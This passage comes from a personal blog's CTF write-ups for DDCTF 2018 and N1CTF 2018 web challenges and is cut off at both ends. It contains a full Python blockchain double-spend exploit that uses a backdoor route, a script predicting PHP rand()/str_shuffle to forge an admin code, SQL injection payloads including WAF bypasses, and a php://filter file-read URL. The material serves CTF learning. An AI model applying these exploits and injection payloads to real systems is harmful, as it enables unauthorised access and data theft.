class="string">'hash'</span>]] = genesis_block</div><div class="line">        </div><div class="line">        <span class="comment"># Then, the bank was hacked by the hacker ...</span></div><div class="line">        handout = create_output_utxo(hacker_address, <span class="number">999999</span>)</div><div class="line">        reserved = create_output_utxo(bank_address, <span class="number">1</span>)</div><div class="line">        transferred = create_tx([total_currency_issued[<span class="string">'id'</span>]], [handout, reserved], bank_privkey)</div><div class="line">        <span class="comment"># print transferred</span></div><div class="line">        second_block = create_block(genesis_block[<span class="string">'hash'</span>], <span class="string">'HAHA, I AM THE BANK NOW!'</span>, [transferred])</div><div class="line">        append_block(second_block)</div><div class="line">        </div><div class="line">        <span class="comment"># Can you buy 2 diamonds using all DDCoins?</span></div><div class="line"></div><div class="line"></div><div class="line">        <span class="comment"># print transferred</span></div><div class="line">        third_block = create_block(second_block[<span class="string">'hash'</span>], <span class="string">'a empty block'</span>, [])</div><div class="line">        append_block(third_block)</div><div class="line"></div><div class="line"><span class="comment"># final</span></div><div class="line">        <span class="comment"># handout2 = create_output_utxo(hacker_address, 1)</span></div><div class="line">        <span class="comment"># transferred = create_tx([total_currency_issued['id']], [handout2], bank_privkey)</span></div><div class="line"></div><div class="line">        <span class="comment"># fake_second_block = create_block(genesis_block['hash'], "aaaa", [])</span></div><div class="line">        <span class="comment"># requests.post(url="http://127.0.0.1:5000/b9744af30897e/create_transaction",data=json.dumps(fake_second_block),proxies = &#123;"http":"http://127.0.0.1:8080"&#125;,headers=&#123;"Content-Type":"application/json"&#125;) </span></div><div class="line">        <span class="comment"># append_block(fake_second_block)</span></div><div class="line">        <span class="comment"># fake_third_block = create_block(fake_second_block['hash'], "aaaa", [])</span></div><div class="line">        <span class="comment"># append_block(fake_third_block)</span></div><div class="line">        <span class="comment"># fake_fourth_block = create_block(fake_third_block['hash'], "aaaa", [])</span></div><div class="line">        <span class="comment"># append_block(fake_fourth_block)</span></div><div class="line"></div><div class="line">        <span class="comment"># try:</span></div><div class="line"><span class="comment"># print "start attack!"</span></div><div class="line"><span class="comment"># x = 0</span></div><div class="line"><span class="comment"># while x &lt;0xfffffff:</span></div><div class="line"><span class="comment"># fouth_block =  create_block(third_block['hash'], str(x), [transferred])</span></div><div class="line"></div><div class="line"><span class="comment"># if  int(fouth_block["hash"],16)&lt;= DIFFICULTY:</span></div><div class="line"><span class="comment"># print fouth_block</span></div><div class="line"><span class="comment"># break</span></div><div class="line"><span class="comment"># x+=1</span></div><div class="line"></div><div class="line">        <span class="comment"># except:</span></div><div class="line"><span class="comment"># print "end at ",hex(x)</span></div><div class="line"><span class="comment"># print "end!"</span></div><div class="line"></div><div class="line"><span class="comment"># append_block(fouth_block)</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_balance_of_all</span><span class="params">()</span>:</span></div><div class="line">    init()</div><div class="line">    tail = find_blockchain_tail()</div><div class="line">    utxos = calculate_utxo(tail)</div><div class="line">    <span class="keyword">return</span> calculate_balance(utxos), utxos, tail</div><div class="line">    </div><div class="line"><span class="meta">@app.route(url_prefix+'/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">homepage</span><span class="params">()</span>:</span></div><div class="line">    balance, utxos, _ = get_balance_of_all()</div><div class="line">    genesis_block_info = <span class="string">'hash of genesis block: '</span> + session[<span class="string">'genesis_block_hash'</span>]</div><div class="line">    addr_info = <span class="string">'the bank\'s addr: '</span> + bank_address + <span class="string">', the hacker\'s addr: '</span> + hacker_address + <span class="string">', the shop\'s addr: '</span> + shop_address</div><div class="line">    balance_info = <span class="string">'Balance of all addresses: '</span> + json.dumps(balance)</div><div class="line">    utxo_info = <span class="string">'All utxos: '</span> + json.dumps(utxos)</div><div class="line">    blockchain_info = <span class="string">'Blockchain Explorer: '</span> + json.dumps(session[<span class="string">'blocks'</span>])</div><div class="line">    view_source_code_link = <span class="string">"&lt;a href='source_code'&gt;View source code&lt;/a&gt;"</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'&lt;br /&gt;&lt;br /&gt;\r\n\r\n'</span>.join([view_source_code_link, genesis_block_info, addr_info, balance_info, utxo_info, blockchain_info])</div><div class="line">    </div><div class="line">    </div><div class="line"><span class="meta">@app.route(url_prefix+'/flag')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFlag</span><span class="params">()</span>:</span></div><div class="line">    init()</div><div class="line">    <span class="keyword">if</span> session[<span class="string">'your_diamonds'</span>] &gt;= <span class="number">2</span>: <span class="keyword">return</span> FLAG()</div><div class="line">    <span class="keyword">return</span> <span class="string">'To get the flag, you should buy 2 diamonds from the shop. You have &#123;&#125; diamonds now. To buy a diamond, transfer 1000000 DDCoins to '</span>.format(session[<span class="string">'your_diamonds'</span>]) + shop_address</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_enough_utxos</span><span class="params">(utxos, addr_from, amount)</span>:</span></div><div class="line">    collected = []</div><div class="line">    <span class="keyword">for</span> utxo <span class="keyword">in</span> utxos.values():</div><div class="line">        <span class="keyword">if</span> utxo[<span class="string">'addr'</span>] == addr_from:</div><div class="line">            amount -= utxo[<span class="string">'amount'</span>]</div><div class="line">            collected.append(utxo[<span class="string">'id'</span>])</div><div class="line">        <span class="keyword">if</span> amount &lt;= <span class="number">0</span>: <span class="keyword">return</span> collected, -amount</div><div class="line">    <span class="keyword">raise</span> Exception(<span class="string">'no enough DDCoins in '</span> + addr_from)</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">transfer</span><span class="params">(utxos, addr_from, addr_to, amount, privkey)</span>:</span></div><div class="line">    input_utxo_ids, the_change = find_enough_utxos(utxos, addr_from, amount)</div><div class="line">    outputs = [create_output_utxo(addr_to, amount)]</div><div class="line">    <span class="keyword">if</span> the_change != <span class="number">0</span>:</div><div class="line">        outputs.append(create_output_utxo(addr_from, the_change))</div><div class="line">    <span class="keyword">return</span> create_tx(input_utxo_ids, outputs, privkey)</div><div class="line">    </div><div class="line"><span class="meta">@app.route(url_prefix+'/5ecr3t_free_D1diCoin_b@ckD00r/&lt;string:address&gt;')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_ddcoin</span><span class="params">(address)</span>:</span></div><div class="line">    balance, utxos, tail = get_balance_of_all()</div><div class="line">    <span class="keyword">if</span> balance[bank_address] == <span class="number">0</span>: <span class="keyword">return</span> <span class="string">'The bank has no money now.'</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        address = str(address)</div><div class="line">        addr_to_pubkey(address) <span class="comment"># to check if it is a valid address</span></div><div class="line">        transferred = transfer(utxos, bank_address, address, balance[bank_address], bank_privkey)</div><div class="line">        new_block = create_block(tail[<span class="string">'hash'</span>], <span class="string">'b@cKd00R tr1993ReD'</span>, [transferred])</div><div class="line">        append_block(new_block)</div><div class="line">        <span class="keyword">return</span> str(balance[bank_address]) + <span class="string">' DDCoins are successfully sent to '</span> + address</div><div class="line">    <span class="keyword">except</span> Exception, e:</div><div class="line">        <span class="keyword">return</span> <span class="string">'ERROR: '</span> + str(e)</div><div class="line"></div><div class="line">DIFFICULTY = int(<span class="string">'00000'</span> + <span class="string">'f'</span> * <span class="number">59</span>, <span class="number">16</span>)</div><div class="line"><span class="meta">@app.route(url_prefix+'/create_transaction', methods=['POST'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_tx_and_check_shop_balance</span><span class="params">()</span>:</span></div><div class="line">    init()</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="comment"># print request.data</span></div><div class="line">        block = json.loads(request.data)</div><div class="line">        append_block(block, DIFFICULTY)</div><div class="line">        msg = <span class="string">'transaction finished.'</span></div><div class="line">    <span class="keyword">except</span> Exception, e:</div><div class="line">        <span class="keyword">return</span> str(e)</div><div class="line">        </div><div class="line">    balance, utxos, tail = get_balance_of_all()</div><div class="line">    <span class="keyword">if</span> balance[shop_address] == <span class="number">1000000</span>:</div><div class="line">        <span class="comment"># when 1000000 DDCoins are received, the shop will give you a diamond</span></div><div class="line">        session[<span class="string">'your_diamonds'</span>] += <span class="number">1</span></div><div class="line">        <span class="comment"># and immediately the shop will store the money somewhere safe.</span></div><div class="line">        transferred = transfer(utxos, shop_address, shop_wallet_address, balance[shop_address], shop_privkey)</div><div class="line">        new_block = create_block(tail[<span class="string">'hash'</span>], <span class="string">'save the DDCoins in a cold wallet'</span>, [transferred])</div><div class="line">        append_block(new_block)</div><div class="line">        msg += <span class="string">' You receive a diamond.'</span></div><div class="line">    <span class="keyword">return</span> msg</div><div class="line">    </div><div class="line">        </div><div class="line"><span class="comment"># if you mess up the blockchain, use this to reset the blockchain.</span></div><div class="line"><span class="meta">@app.route(url_prefix+'/reset')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset_blockchain</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="string">'blocks'</span> <span class="keyword">in</span> session: <span class="keyword">del</span> session[<span class="string">'blocks'</span>]</div><div class="line">    <span class="keyword">if</span> <span class="string">'genesis_block_hash'</span> <span class="keyword">in</span> session: <span class="keyword">del</span> session[<span class="string">'genesis_block_hash'</span>]</div><div class="line">    <span class="keyword">return</span> <span class="string">'reset.'</span></div><div class="line">    </div><div class="line"><span class="meta">@app.route(url_prefix+'/source_code')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_source_code</span><span class="params">()</span>:</span></div><div class="line">    source = open(<span class="string">'serve.py'</span>, <span class="string">'r'</span>)</div><div class="line">    html = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> source:</div><div class="line">        html += line.replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;amp;'</span>).replace(<span class="string">'\t'</span>, <span class="string">'&amp;nbsp;'</span>*<span class="number">4</span>).replace(<span class="string">' '</span>,<span class="string">'&amp;nbsp;'</span>).replace(<span class="string">'&lt;'</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>).replace(<span class="string">'\n'</span>, <span class="string">'&lt;br /&gt;'</span>)</div><div class="line">    source.close()</div><div class="line">    <span class="keyword">return</span> html</div><div class="line">    </div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    app.run(debug=<span class="keyword">False</span>, host=<span class="string">'0.0.0.0'</span>)</div></pre></td></tr></table></figure><p>payload代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span>  server <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line">x = <span class="number">0</span></div><div class="line"></div><div class="line">ip = <span class="string">"116.85.48.107"</span></div><div class="line">port = <span class="string">"5000"</span></div><div class="line"></div><div class="line"></div><div class="line">r = requests.get(<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/"</span>)</div><div class="line"></div><div class="line"></div><div class="line">genesis_block = re.findall(<span class="string">r'genesis block: (.*)&lt;br /&gt;&lt;br /&gt;'</span>,r.content)[<span class="number">0</span>]</div><div class="line">shop_addr = re.findall(<span class="string">r"the shop's addr: (.*)&lt;br /&gt;&lt;br /&gt;"</span>,r.content)[<span class="number">0</span>]</div><div class="line">cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line"></div><div class="line"><span class="comment"># print shop_addr</span></div><div class="line"></div><div class="line"><span class="comment"># print genesis_block</span></div><div class="line">block_hash = genesis_block</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">try</span>:</div><div class="line"><span class="keyword">print</span> <span class="string">"start attack!"</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">3</span>):</div><div class="line"><span class="keyword">while</span> x &lt;<span class="number">0xfffffff</span>:</div><div class="line">new_block =  create_block(block_hash, str(x), [])</div><div class="line">x+=<span class="number">1</span></div><div class="line"><span class="keyword">if</span>  int(new_block[<span class="string">"hash"</span>],<span class="number">16</span>) &lt;= DIFFICULTY:</div><div class="line">r = requests.post(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/create_transaction"</span>,data=json.dumps(new_block),proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie,<span class="string">"Content-Type"</span>:<span class="string">"application/json"</span>&#125;)</div><div class="line"></div><div class="line">cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line">block_hash = new_block[<span class="string">'hash'</span>]</div><div class="line"></div><div class="line"><span class="keyword">break</span></div><div class="line"></div><div class="line"></div><div class="line">r = requests.get(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/5ecr3t_free_D1diCoin_b@ckD00r/"</span>+shop_addr,proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie&#125;)</div><div class="line"></div><div class="line">cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line">block_hash = genesis_block</div><div class="line"></div><div class="line"><span class="keyword">except</span> Exception,e:</div><div class="line"><span class="keyword">print</span> <span class="string">"end at "</span>,hex(x)</div><div class="line"><span class="keyword">print</span> e</div><div class="line"><span class="keyword">print</span> <span class="string">"end!"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">try</span>:</div><div class="line"><span class="keyword">print</span> <span class="string">"start attack!"</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">5</span>):</div><div class="line"><span class="keyword">while</span> x &lt;<span class="number">0xfffffff</span>:</div><div class="line">new_block =  create_block(block_hash, str(x), [])</div><div class="line">x+=<span class="number">1</span></div><div class="line"><span class="keyword">if</span>  int(new_block[<span class="string">"hash"</span>],<span class="number">16</span>) &lt;= DIFFICULTY:</div><div class="line">r = requests.post(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/create_transaction"</span>,data=json.dumps(new_block),proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie,<span class="string">"Content-Type"</span>:<span class="string">"application/json"</span>&#125;)</div><div class="line"></div><div class="line">cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line">block_hash = new_block[<span class="string">'hash'</span>]</div><div class="line"></div><div class="line"><span class="keyword">break</span></div><div class="line"></div><div class="line"></div><div class="line">r = requests.get(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/5ecr3t_free_D1diCoin_b@ckD00r/"</span>+shop_addr,proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie&#125;)</div><div class="line"></div><div class="line">cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line">block_hash = genesis_block</div><div class="line"></div><div class="line"><span class="keyword">except</span> Exception,e:</div><div class="line"><span class="keyword">print</span> <span class="string">"end at "</span>,hex(x)</div><div class="line"><span class="keyword">print</span> e</div><div class="line"><span class="keyword">print</span> <span class="string">"end!"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">while</span> x &lt;<span class="number">0xfffffff</span>:</div><div class="line">new_block =  create_block(block_hash, str(x), [])</div><div class="line">x+=<span class="number">1</span></div><div class="line"><span class="keyword">if</span>  int(new_block[<span class="string">"hash"</span>],<span class="number">16</span>) &lt;= DIFFICULTY:</div><div class="line">r = requests.post(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/create_transaction"</span>,data=json.dumps(new_block),proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie,<span class="string">"Content-Type"</span>:<span class="string">"application/json"</span>&#125;)</div><div class="line"></div><div class="line">cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line">block_hash = new_block[<span class="string">'hash'</span>]</div><div class="line"></div><div class="line"><span class="keyword">break</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> requests.get(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/flag"</span>,proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie&#125;).content</div></pre></td></tr></table></figure><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>看到提示，直接下载源码，代码审计ing  </p><p>发现首页存在sql注入，但是需要admin的权限才能进行注入，而注册成为admin则需要一个code，则个code由<code>str_shuffle</code>这个关键函数函数生成。</p><img src="/2018/04/19/ddctf-2018/12.png" alt="12.png" title=""><p>通过谷歌搜索这个函数的相关缺陷，发现这个函数内部是由rand()函数来决定随机性的，那么接下来就好办了。</p><img src="/2018/04/19/ddctf-2018/13.png" alt="13.png" title=""><p>rand()函数是一个可预测的伪随机函数，具体可以参考  <a href="http://www.yqxiaojunjie.com/index.php/archives/275/" target="_blank" rel="external">http://www.yqxiaojunjie.com/index.php/archives/275/</a></p><p>再分析下 <code>RAND_RANGE</code> 的构成</p><img src="/2018/04/19/ddctf-2018/14.png" alt="14.png" title=""><p>于是根据str_shuffle的源码，来实现python版本的<code>str_shuffle</code>，写出对应的预测算法。python脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">s = requests.Session()</div><div class="line"></div><div class="line">l  = [<span class="number">0</span>]*<span class="number">200</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>):</div><div class="line">l[i] = re.findall(<span class="string">r'csrf" value="(.*)"'</span>,s.get(<span class="string">"http://116.85.39.110:5032/2096b322e99ffc1a59891b972c0fa612/login.php"</span>).content)[<span class="number">0</span>]</div><div class="line"><span class="comment"># l[i] = s.get("http://192.168.148.137/rand.php").content</span></div><div class="line"><span class="keyword">print</span> i,l[i]</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">112</span>):</div><div class="line">m  = (int(l[i<span class="number">-3</span>])+int(l[i<span class="number">-31</span>])) % <span class="number">2147483647</span></div><div class="line"><span class="keyword">if</span> i &gt;=<span class="number">50</span>:</div><div class="line"><span class="keyword">print</span> <span class="string">"*"</span>,i,m,l[i<span class="number">-3</span>],l[i<span class="number">-31</span>],m,float(m) * (<span class="number">62</span>-(i<span class="number">-49</span>)) / <span class="number">2147483647</span> </div><div class="line">l[i] = m</div><div class="line"><span class="keyword">continue</span></div><div class="line"><span class="keyword">print</span> i,l[i],l[i<span class="number">-3</span>],l[i<span class="number">-31</span>],m</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">i = <span class="number">50</span></div><div class="line">org_str  = list(<span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>)</div><div class="line"></div><div class="line">str_len = len(org_str) - <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">while</span>(str_len):</div><div class="line"><span class="comment"># rnd_index = int(round(float(l[i]) * (str_len+0) / 2147483647))</span></div><div class="line"> <span class="comment"># (__n) = (__min) + (long) ((double) ( (double) (__max) - (__min) + 1.0) * ((__n) / ((__tmax) + 1.0)))</span></div><div class="line">min = <span class="number">0</span></div><div class="line">rnd_index = l[i]</div><div class="line">rnd_index = min +int( (float(str_len) - min +<span class="number">1.0</span>) * (rnd_index / (<span class="number">2147483647</span>+<span class="number">1.0</span>)) )</div><div class="line"><span class="keyword">if</span> rnd_index != str_len:</div><div class="line">temp = org_str[str_len]</div><div class="line">org_str[str_len] = org_str[rnd_index]</div><div class="line">org_str[rnd_index] = temp</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">''</span>.join(org_str)</div><div class="line">str_len -=<span class="number">1</span></div><div class="line">i+=<span class="number">1</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># a =  org_str[:32]</span></div><div class="line"></div><div class="line">data = &#123;<span class="string">"csrf"</span>: l[<span class="number">49</span>],</div><div class="line"><span class="string">"username"</span>: <span class="string">"winter3un2"</span>,</div><div class="line"><span class="string">"password"</span>: <span class="string">"123456"</span>,</div><div class="line"><span class="string">"code"</span>: <span class="string">"admin###"</span>+<span class="string">""</span>.join(org_str)[:<span class="number">32</span>]</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">print</span> s.post(<span class="string">"http://116.85.39.110:5032/2096b322e99ffc1a59891b972c0fa612/register.php"</span>,data=data).content</div></pre></td></tr></table></figure><p>注册登陆后，利用sprinf函数中<code>%</code>会吞掉下一个字符的特性，具体参考 <a href="https://www.cnblogs.com/test404/p/7821884.html" target="_blank" rel="external">https://www.cnblogs.com/test404/p/7821884.html</a>  构造注入payload</p><p><code>http://116.85.39.110:5032/2096b322e99ffc1a59891b972c0fa612/?id=%20union%20select%201,2,f14g%20%20from%20key%20%23&amp;title=%1$%27%1$s</code></p><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>首页源码中有用户名密码，登陆后发现一个存在任意文件下载漏洞的api，利用这个api下载源码分析。。。。</p><p>没分析出来啊！  虽然知道是ssrf ，super admin 的用户名也拿到了，但是登陆不了啊，接下去怎么玩啊，求指点！</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;工作需要较强的web安全能力，所以我想通过打ctf的web类题目来提高这方面的水平，以下为这次didictf web类的题解。&lt;/p&gt;
    
    </summary>
    
    
      <category term="web" scheme="https://winter3un.github.io/tags/web/"/>
    
      <category term="writeup" scheme="https://winter3un.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>n1ctf 2018 web writeup</title>
    <link href="https://winter3un.github.io/2018/03/19/2018-n1ctf/"/>
    <id>https://winter3un.github.io/2018/03/19/2018-n1ctf/</id>
    <published>2018-03-19T11:20:26.000Z</published>
    <updated>2018-03-19T11:23:40.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为工作上涉及到web知识的比较多，所以作为pwn选手，这次并没有关注pwn的任何一题题目。。反倒是把web题做了个一遍ORZ</p><a id="more"></a><h2 id="77777"><a href="#77777" class="headerlink" title="77777"></a>77777</h2><p>PS：<strong>这个系列题真虐狗</strong></p><p>题目的关键代码如下所示，接收用户发送过来的 flag 和hi 参数，并通过waf和sprintf格式化生成sql语句，关键点在于如何绕过waf函数（我这边写的waf函数和出题人写的是不一样，只是用于本地测试。）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($points)</span></span></div><div class="line">  &#123;</div><div class="line">  <span class="keyword">return</span> $points;</div><div class="line">  &#125;</div><div class="line">   </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">update_point</span><span class="params">($p,$points)</span></span></div><div class="line">&#123;</div><div class="line">$link=mysqli_connect(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>,<span class="string">'ctf_test'</span>);  </div><div class="line"></div><div class="line">$q = sprintf(<span class="string">"UPDATE user SET points =%d%s"</span>,$p,waf($points));</div><div class="line">var_dump($q);</div><div class="line"><span class="keyword">if</span>(!$query =mysqli_query($link,$q)) <span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line"><span class="keyword">return</span> <span class="keyword">TRUE</span>;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!update_point($_REQUEST[<span class="string">'flag'</span>],$_REQUEST[<span class="string">'hi'</span>]))<span class="keyword">echo</span> <span class="string">'sorry'</span>;</div></pre></td></tr></table></figure><p>很明显，注入点在于points这个参数。</p><p><code>docker pull ubuntu:16.04</code>本地搭建好环境测试一波。</p><p>构建数据库语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">create database ctf_test；</div><div class="line">use ctf_test;</div><div class="line">create table user (id int,name text,points int);</div></pre></td></tr></table></figure></p><p>构造update查询的注入 payload 。</p><p>查询数据库当前用户信息，发送<code>flag=0&amp;hi=%2bconv(hex(substr(user(),1, 4)), 16, 10)</code>生成查询语句，<code>UPDATE user SET points = 0+conv(hex(substr(user(),1, 4)), 16, 10)</code>，发现竟然没有被waf挡住。。。</p><p>查询当前用户表中用户密码，发送<code>flag=0&amp;hi=%2bconv(hex(substr((select password),1, 4)), 16, 10)</code>，生成查询语语句 <code>UPDATE user SET points = 0+conv(hex(substr((select password),1, 4)), 16, 10)</code>，又过了waf。。。 ？（当时有点怀疑waf的真实性，不过后来测试admin、database都被waf挡住了，拿flag做题还是没问题的，但是万一flag不在当前用户的记录里呢，怎么做偏移？~</p><h2 id="77777-2"><a href="#77777-2" class="headerlink" title="77777-2"></a>77777-2</h2><p>emmmm关键的代码没有变，加强了waf，把password，pw，union等关键词挡住了，但是可以用如下的姿势绕过。</p><p><code>flag=0&amp;hi=%2bconv(hex(substr((select pw ),1, 4)), 16, 10)</code></p><p>没错。。pw左右各一个空格就绕过了，玄学。。</p><p>后台生成查询语句为<code>UPDATE user SET points = 0+conv(hex(substr((select pw ),1, 4)), 16, 10)</code> 应该是非预期，话说正解到底是啥？</p><h2 id="funning-eating-cms"><a href="#funning-eating-cms" class="headerlink" title="funning eating cms"></a>funning eating cms</h2><p>一个cms系统。。用了网上的模版。</p><p><code>index.php</code>页面的page参数存在文件包含漏洞，但是文件后缀名必须是php的才能包含，无法用来命令执行，只能看下源码，操作姿势<a href="http://47.52.152.93:20000/user.php?page=php://filter/read=convert.base64-encode/resource=config" target="_blank" rel="external">http://47.52.152.93:20000/user.php?page=php://filter/read=convert.base64-encode/resource=config</a></p><p>把看到的php文件都下载到本地，审计一波，发现<code>function.php</code>文件内<code>parse_url</code>函数存在绕过，当构造<code>////x.php?key=value</code>这种形式的uri的时候，parse_url函数将无法解析该uri。</p><p>之后在<a href="http://47.52.152.93:20000/templates/info.html" target="_blank" rel="external">http://47.52.152.93:20000/templates/info.html</a> 的源码里得知关键信息在<code>ffffllllaaaaggg.php</code>文件里面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td 